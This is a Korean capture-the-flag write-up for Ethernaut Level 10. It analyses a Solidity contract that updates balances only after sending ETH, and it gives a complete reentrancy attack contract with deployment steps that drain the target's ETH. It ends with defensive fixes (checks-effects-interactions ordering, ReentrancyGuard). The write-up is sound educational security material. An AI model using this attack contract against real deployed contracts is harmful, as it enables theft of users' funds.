# Ethernaut Level 10 - Re-entrancy

## 문제 설명

재진입 공격(Re-entrancy Attack)을 통해 컨트랙트의 모든 ETH를 탈취하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract Reentrance {
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;  // ← 잔액 차감이 전송 후에 발생
        }
    }
}
```

---

## 취약점 분석

### 1. Checks-Effects-Interactions 패턴 위반

```
올바른 순서: 검증 → 상태 변경 → 외부 호출
취약한 순서: 검증 → 외부 호출 → 상태 변경  ← 이 컨트랙트
```

### 2. 재진입 공격 흐름

```
1. 공격자 withdraw() 호출
2. 컨트랙트가 공격자에게 ETH 전송 (call)
3. 공격자 receive() 자동 실행
4. receive() 안에서 다시 withdraw() 호출  ← 재진입!
5. 아직 balances가 차감되지 않았으므로 또 출금
6. 반복 → ETH 전부 탈취
```

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    IReentrance public target;
    uint public amount = 0.001 ether;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    function attack() public payable {
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

---

## 공격 단계

### Step 1 — 현재 컨트랙트 잔액 확인

```js
await getBalance(contract.address)
```

### Step 2 — 공격 컨트랙트 배포

```
_target : Reentrance 인스턴스 주소
```

### Step 3 — attack 실행

Value: 0.001 ETH 설정 후 attack() 호출

### Step 4 — 확인

```js
await getBalance(contract.address)
// → 0
```

---

## 핵심 교훈

```solidity
// ❌ 위험
(bool result,) = msg.sender.call{value: _amount}("");
balances[msg.sender] -= _amount;

// ✅ 안전 (CEI 패턴)
balances[msg.sender] -= _amount;  // 상태 먼저 변경
(bool result,) = msg.sender.call{value: _amount}("");

// ✅ 또는 ReentrancyGuard 사용
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
```

이더리움 역사상 가장 유명한 취약점으로, DAO 해킹(2016)에 사용된 방식이다.
